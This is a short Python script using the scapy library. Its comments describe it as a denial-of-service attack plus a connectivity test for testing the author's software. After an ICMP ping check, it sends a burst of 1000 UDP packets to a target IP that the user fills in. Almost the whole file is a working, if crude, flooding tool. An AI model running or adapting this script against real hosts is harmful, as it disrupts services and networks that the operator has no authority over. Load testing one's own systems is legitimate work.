'''
creator: Cameron

creates a dos attack and a connectivity test. 
for testing the software.
'''
from scapy.all import *
from scapy.all import IP, ICMP, TCP, UDP
test_flag = 0
#tests conectiveity with sending ICMP packet and waiting for responce 
def con_test(ip): 
    print("testing connectivity...")
    ans, unans =sr(IP(dst=ip)/ICMP(),timeout=60)
    print(ans,"\n",unans)
ip = "" # put target ip here 
if test_flag == 0:
    con_test(ip)
# send the packets to target to create attack
send(IP(dst=ip)/UDP(),count=1000)